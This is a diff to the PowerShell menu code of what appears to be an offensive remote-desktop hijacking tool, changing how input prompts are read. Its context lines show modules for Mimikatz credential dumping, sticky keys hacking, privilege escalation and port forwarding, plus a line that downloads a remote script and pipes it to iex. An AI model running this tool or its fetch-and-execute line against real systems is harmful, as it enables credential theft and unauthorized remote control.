@@ -53,8 +53,8 @@ function Test-Command {
     Finally {$ErrorActionPreference=$oldPreference}}
     
     do { Show-Banner ; Show-Language
-    $Random = New-Object System.Random ; "Choose your language" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $input = Read-Host -Prompt " "
+    $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+    $input = $Host.UI.ReadLine()
     switch ($input) { 
        '1' { $Language = 'English' } 
        '2' { $Language = 'Spanish' } 
@@ -68,8 +68,8 @@ if($Language -in 'English') {
   $txt3b = "You can download the latest version here"
   $txt3c = "Your operating system is not compatible with this attack, choose another one"
   $txt4  = "Incorrect option, try again"
-  $txt5  = "Choose how you want to launch the attack"
-  $txt6  = "Choose the module you want to load"
+  $txt5  = "Choose how you want to launch the attack:` "
+  $txt6  = "Choose the module you want to load:` "
   $txt7a = "Recover local hashes"
   $txt7b = "Recover plaintext passwords"
   $txt7c = "Rebuild the image cache"
@@ -91,7 +91,7 @@ if($Language -in 'English') {
   $txt16 = "Finally, the NTLM hash"
   $txt17 = "Do you want to connect through PSSession?"
   $txt18 = "Elevating privileges with token duplication.."
-  $txt19 = "Do you want to see or control the computer?"
+  $txt19 = "Do you want to see or control the computer?:` "
   $txt20 = "Modifying permissions to view the remote computer.."
   $txt21 = "Modifying permissions to control the remote computer.."
   $txt22 = "Changes in the Windows registry made successfully"
@@ -124,8 +124,8 @@ if($Language -in 'Spanish') {
   $txt3b = "Puedes decargar la última versión aquí"
   $txt3c = "Tu sistema operativo no es compatible con este ataque, elige otro"
   $txt4  = "Opción incorrecta, vuelve a intentarlo de nuevo"
-  $txt5  = "Elige cómo quieres lanzar el ataque"
-  $txt6  = "Elige el módulo que quieres cargar"
+  $txt5  = "Elige cómo quieres lanzar el ataque:` "
+  $txt6  = "Elige el módulo que quieres cargar:` "
   $txt7a = "Recuperar hashes locales"
   $txt7b = "Recuperar contraseñas en texto plano"
   $txt7c = "Reconstruir la caché de imágenes"
@@ -147,7 +147,7 @@ if($Language -in 'Spanish') {
   $txt16 = "Por último, el hash NTLM"
   $txt17 = "Quieres conectarte a través de PSSession?"
   $txt18 = "Elevando privilegios con token duplication.."
-  $txt19 = "Quieres ver o controlar el equipo?"
+  $txt19 = "Quieres ver o controlar el equipo?:` "
   $txt20 = "Modificando permisos para visualizar el equipo remoto.."
   $txt21 = "Modificando permisos para controlar el equipo remoto.."
   $txt22 = "Cambios en el registro de Windows realizados con éxito"
@@ -181,7 +181,7 @@ if($Language -in 'Spanish') {
 
     do { Show-Banner ; Show-Menu
     $Random = New-Object System.Random ; $txt5 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $input = Read-Host -Prompt " "
+    $input = $Host.UI.ReadLine()
     switch ($input) {
 
         '1' {
@@ -281,10 +281,10 @@ if($Language -in 'Spanish') {
         Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - $txt9a" ; Write-Host "[3] - $txt9b" ; Write-Host "[4] - Remote Desktop Forensics"
         Write-Host "[5] - Sticky Keys Hacking" ; Write-Host "[6] - Local Port Forwarding" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $module = Read-Host -Prompt " " ; Write-Host ""
+        $module = $Host.UI.ReadLine() ; Write-Host ""
         if($module -like '1') { Show-Banner ; Write-Host "[1] - $txt7a" ; Write-Host "[2] - $txt7b" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $mimikatz = Read-Host -Prompt " " ; Write-Host ""
+        $mimikatz = $Host.UI.ReadLine() ; Write-Host ""
 
         if($mimikatz -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
@@ -315,7 +315,7 @@ if($Language -in 'Spanish') {
 
         if($module -like '4') { Show-Banner ; Write-Host "[1] - $txt7c" ; Write-Host "[2] - $txt7d" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $forensics = Read-Host -Prompt " " ; Write-Host ""
+        $forensics = $Host.UI.ReadLine() ; Write-Host ""
         if($forensics -like '1') { Write-Host "$txt10" -ForegroundColor Green ; Write-Host "" ; Write-Host "$txt9c" -ForegroundColor Magenta
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex 
         explorer $env:temp\Recovered_RDP_Session ; Write-Host "" ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force }
@@ -328,7 +328,7 @@ if($Language -in 'Spanish') {
 	
         if($module -like '6') { Show-Banner ; Write-Host "[1] - $txt8c" ; Write-Host "[2] - $txt8d" ; Write-Host "[3] - $txt9d" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $forwarding = Read-Host -Prompt " " ; Write-Host "" ; if($forwarding -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; Write-Host ""
+        $forwarding = $Host.UI.ReadLine() ; Write-Host "" ; if($forwarding -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; Write-Host ""
         $lport = Read-Host -Prompt "$txt31" ; Write-Host "" ; $lhost = Read-Host -Prompt "$txt32" ; Write-Host "" ; $rport = Read-Host -Prompt "$txt33" ; Write-Host "" ; $rhost = Read-Host -Prompt "$txt34"
         netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt35" -ForegroundColor Yellow ; sleep -milliseconds 1000 }
         
@@ -356,7 +356,7 @@ if($Language -in 'Spanish') {
         do { $Host.UI.RawUI.ForegroundColor = 'Gray'
 	if ($stickykeys){ $input = "control" } else { Write-Host "" ; 
         $Random = New-Object System.Random ; $txt19 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $input = Read-Host -Prompt " " }
+        $input = $Host.UI.ReadLine() }
         switch -wildcard ($input) {
 
         'ver' { $control = "false" ; Write-Host "" ;
